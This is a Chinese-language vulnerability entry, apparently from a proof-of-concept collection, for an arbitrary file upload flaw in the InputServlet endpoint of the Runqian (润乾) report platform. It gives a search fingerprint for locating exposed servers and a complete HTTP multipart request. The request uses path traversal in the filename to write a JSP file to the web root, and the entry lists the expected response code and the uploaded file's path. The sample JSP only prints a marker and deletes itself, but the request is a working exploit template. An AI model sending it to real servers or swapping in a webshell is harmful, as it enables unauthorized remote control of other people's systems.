﻿# 润乾报表平台 InputServlet 任意文件上传漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：润乾报表平台InputServlet接口处存在任意文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

> 漏洞特征：body="润乾报表"

> 验证脚本：HTTP

```
POST /InputServlet?action=12 HTTP/1.1
Content-Type: multipart/form-data; boundary=878byugbhfverkyfhbh675667
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 
Connection: close

--878byugbhfverkyfhbh675667
Content-Disposition: form-data; name="upsize"

1024
--878byugbhfverkyfhbh675667
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\dudesuite.jsp"
Content-Type: image/jpeg

<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--878byugbhfverkyfhbh675667--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/dudesuite.jsp

> 验证文件来源：润乾报表平台 InputServlet 任意文件上传漏洞.poc

